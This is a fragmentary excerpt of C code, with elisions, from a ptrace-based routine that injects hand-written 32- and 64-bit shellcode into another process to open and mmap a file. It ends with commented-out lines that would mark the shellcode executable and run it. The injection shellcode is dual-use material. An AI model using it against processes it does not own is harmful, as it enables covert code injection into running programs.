...
long ptrace_mmapfd(pid_t pid,char *path)
{
  ...
  char sc64[] =
    ...
    "\x48\x31\xc0\xb0\x09\x0f\x05\xcc"
    "\x50\x4c\x89\xc7\x48\x31\xc0\xb0"
    "\x03\x0f\x05\xcc\x58\xcc\xe8\xc5"
    "\xff\xff\xff\x90";
  ...
  char sc32[] =
    ...
    "\x31\xc0\x31\xd2"
     /* accutal hellcode */
    "\xeb\x2e\x5b\x31\xd2\x31\xc9\xb0"
    "\x05\xcd\x80\xcc\x89\xc7\xb9\x41"
    "\x41\x41\x41\x31\xed\x31\xdb\x31"
    "\xf6\x46\x46\xb2\x05\x31\xc0\xb0"
    "\xc0\xcd\x80\xcc\x50\x89\xfb\x31"
    "\xc0\xb0\x06\xcd\x80\xcc\x58\xcc"
    "\xe8\xcd\xff\xff\xff";
  ...
  *ptr = (long) sb.st_size;
  ...
  /* long addr = ((long)sce) & 0xfffff000; */
  /* mprotect(addr,sce - addr + scsize+strlen(path),0x7); */
  /* void (*shell)(); */
  /* shell = sce; */
  /* shell(); */
